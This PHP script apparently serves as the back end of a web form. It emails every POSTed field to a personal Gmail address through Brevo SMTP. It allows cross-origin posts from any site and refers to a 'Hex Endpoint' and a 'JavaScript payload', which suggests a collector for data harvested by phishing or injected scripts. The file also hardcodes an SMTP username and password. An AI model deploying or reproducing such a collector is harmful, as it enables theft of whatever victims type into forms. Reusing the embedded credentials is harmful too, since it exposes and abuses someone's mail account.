<?php
// Wasmer par maujood send_logic.php – with duplicate protection
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

// ═══ START DUPLICATE PREVENTION ═══
session_start();
$duplicate_window = 10; // seconds – adjust if needed

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $post_hash = md5(serialize($_POST));   // unique fingerprint of this submission

    if (isset($_SESSION['last_post_hash']) && $_SESSION['last_post_hash'] === $post_hash) {
        $elapsed = time() - $_SESSION['last_post_time'];
        if ($elapsed < $duplicate_window) {
            // Same content arrived too soon – silently drop and pretend success
            http_response_code(200);
            echo "success";
            exit;
        }
    }
// ═══ END DUPLICATE PREVENTION ═══

    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST");

    $mail = new PHPMailer(true);

    try {
        // Brevo SMTP Settings
        $mail->isSMTP();
        $mail->Host       = 'smtp-relay.brevo.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'ab2b68001@smtp-brevo.com'; 
        $mail->Password   = 'bsknvfTPYzK3DVt'; 
        $mail->Port       = 587;
        $mail->SMTPSecure = 'tls'; 

        // Sender & Receiver
        $mail->setFrom('arzajejo@arzajejo.xyz', 'Arzajejo Form');
        $mail->addAddress('alibrohi883@gmail.com'); 

        // Content
        $mail->isHTML(true);
        $mail->Subject = 'New Form Submission via Hex Endpoint';

        // Data build karna
        $message_body = "<h3>New Form Data Received:</h3>";
        if (!empty($_POST)) {
            foreach ($_POST as $key => $value) {
                $message_body .= "<b>" . ucfirst($key) . ":</b> " . htmlspecialchars($value) . "<br>";
            }
        } else {
            $message_body .= "No data fields captured. Check JavaScript payload.";
        }

        $mail->Body = $message_body;
        $mail->send();

        // ═══ UPDATE DUPLICATE CHECK DATA ═══
        $_SESSION['last_post_hash'] = $post_hash;
        $_SESSION['last_post_time'] = time();
        // ═══════════════════════════════════

        echo "success";
    } catch (Exception $e) {
        echo "Mailer Error: " . $mail->ErrorInfo;
    }
} else {
    echo "Direct access not allowed.";
}
